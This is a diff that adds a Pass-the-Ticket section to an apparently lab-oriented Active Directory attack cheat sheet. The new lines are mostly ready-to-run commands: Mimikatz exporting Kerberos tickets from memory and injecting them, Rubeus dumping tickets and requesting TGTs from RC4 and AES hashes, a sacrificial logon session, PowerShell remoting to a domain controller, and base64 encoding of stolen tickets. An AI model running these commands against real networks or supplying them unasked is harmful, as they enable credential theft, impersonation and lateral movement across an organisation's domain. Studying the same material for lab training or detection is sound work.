@@ -41,3 +41,63 @@ username=john
 export KRB5CCNAME=/full/path/to/john.ccache
 python3 psexec.py $domain/$username@$target -k -no-pass
 ```
+
+---
+
+## Pass the Ticket - Mimikatz
+
+### Export All Tickets
+
+```
+mimikatz # privilege::debug
+mimikatz # sekurlsa::tickets /export
+```
+
+### Import .kirbi Ticket
+
+```
+mimikatz # kerberos::ptt "C:\Users\plaintext\Desktop\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
+```
+
+## Pass the Ticket - Rubeus
+
+### Dump Tickets
+
+```
+Rubeus.exe dump /nowrap
+```
+
+### Request TGT and Inject (Pass the Key / OverPass the Hash)
+
+```
+Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
+```
+
+### Import .kirbi
+
+```
+Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
+```
+
+### Create Sacrificial Logon Session + PtT
+
+```
+Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
+Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
+```
+
+## PtT with PowerShell Remoting
+
+```
+mimikatz # kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
+```
+
+```powershell
+Enter-PSSession -ComputerName DC01
+```
+
+## Convert .kirbi to Base64
+
+```powershell
+[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
+```
